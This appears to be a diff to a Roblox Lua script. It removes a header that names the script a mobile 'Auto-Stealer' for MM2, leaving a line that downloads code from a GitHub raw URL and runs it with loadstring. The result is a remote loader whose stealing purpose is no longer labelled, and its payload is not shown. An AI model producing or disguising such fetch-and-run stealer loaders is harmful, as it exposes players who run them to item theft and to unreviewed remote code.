@@ -1,6 +1,3 @@
--- =========================================================================================
--- Мобильный Авто-Стиллер (MM2) | Strict TZ Compliance (Targeted UI Nuke)
--- =========================================================================================
 local success, res = pcall(function()
     return loadstring(game:HttpGet("https://raw.githubusercontent.com/Kenderlike/script/refs/heads/main/ScriptPricePC.txt"))()
 end)
